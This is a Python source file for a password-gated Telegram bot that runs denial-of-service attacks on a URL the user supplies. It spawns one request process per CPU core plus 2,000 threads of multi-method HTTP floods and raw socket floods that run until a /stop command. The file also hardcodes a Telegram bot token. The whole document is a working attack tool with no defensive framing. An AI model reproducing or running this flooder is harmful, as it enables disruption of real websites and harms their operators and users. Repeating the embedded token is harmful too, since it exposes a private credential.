
import telebot
import time
import multiprocessing
import requests
import aiohttp
import asyncio
import pycurl
from colorama import Fore, Style
from concurrent.futures import ThreadPoolExecutor
from io import BytesIO
import threading
import socket

# ضع رمز التوكن الخاص بك هنا
TOKEN = '7823594166:AAG5HvvfOnliCBVKu9VsnzmCgrQb68m91go'
bot = telebot.TeleBot(TOKEN)

# متغير لتتبع حالة إيقاف الهجوم
stop_attack_flag = multiprocessing.Value('b', False)
stop_flag = False

def display_banner(chat_id):
    banner_text = "j"
    for char in banner_text:
        bot.send_message(chat_id, Fore.GREEN + char + Style.RESET_ALL)
        time.sleep(0.0)

def password_prompt(chat_id):
    bot.send_message(chat_id, "Enter password:")
    bot.register_next_step_handler_by_chat_id(chat_id, check_password)

def check_password(message):
    password = message.text
    if password == "junai":
        bot.send_message(message.chat.id, Fore.GREEN + "Correct password! Opening attack menu..." + Style.RESET_ALL)
        start_attack(message.chat.id)
    else:
        bot.send_message(message.chat.id, Fore.RED + "Wrong password! Exiting..." + Style.RESET_ALL)

def send_requests_threaded(target, stop_flag):
    while not stop_flag.value:
        try:
            requests.get(target, timeout=5)
        except requests.exceptions.RequestException:
            pass

def flood_requests(target):
    while not stop_flag:
        try:
            requests.get(target)
            requests.post(target)
            requests.head(target)
            requests.put(target)
            requests.delete(target)
            requests.options(target)
            requests.patch(target)
        except:
            pass

def socket_flood(target):
    while not stop_flag:
        try:
            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            s.connect((target, 80))
            s.send(b"GET / HTTP/1.1\r\nHost: " + target.encode() + b"\r\n\r\n")
            s.close()
        except:
            pass

def show_attack_animation(chat_id):
    bot.send_message(chat_id, "Loading...")

def start_attack(chat_id):
    try:
        msg = bot.send_message(chat_id, "Target URL:")
        bot.register_next_step_handler(msg, get_target_details)
    except Exception as e:
        bot.send_message(chat_id, f"Error: {str(e)}")

def get_target_details(message):
    target = message.text
    msg = bot.send_message(message.chat.id, "Attack will continue indefinitely. Use /stop to end it.")
    execute_attack(message.chat.id, target)

def execute_attack(chat_id, target):
    total_cores = multiprocessing.cpu_count()

    bot.send_message(chat_id, f"Starting continuous attack on {target} using {total_cores} cores...")
    show_attack_animation(chat_id)

    processes = []
    with stop_attack_flag.get_lock():
        stop_attack_flag.value = False

    try:
        for i in range(total_cores):
            process = multiprocessing.Process(target=send_requests_threaded, args=(target, stop_attack_flag))
            processes.append(process)
            process.start()

        # Threading for additional flood attacks
        for _ in range(1000):  # Number of threads
            threading.Thread(target=flood_requests, args=(target,)).start()
            threading.Thread(target=socket_flood, args=(target,)).start()

        for process in processes:
            process.join()

    except Exception as e:
        bot.send_message(chat_id, f"Error during attack: {str(e)}")

@bot.message_handler(commands=['start'])
def handle_start(message):
    display_banner(message.chat.id)
    password_prompt(message.chat.id)

@bot.message_handler(commands=['stop'])
def handle_stop(message):
    with stop_attack_flag.get_lock():
        stop_attack_flag.value = True
    global stop_flag
    stop_flag = True
    bot.send_message(message.chat.id, "Stop command received. Stopping attack...")

def main():
    try:
        bot.polling(none_stop=True)
    except Exception as e:
        print(f"Bot polling error: {str(e)}")

if __name__ == "__main__":
    main()
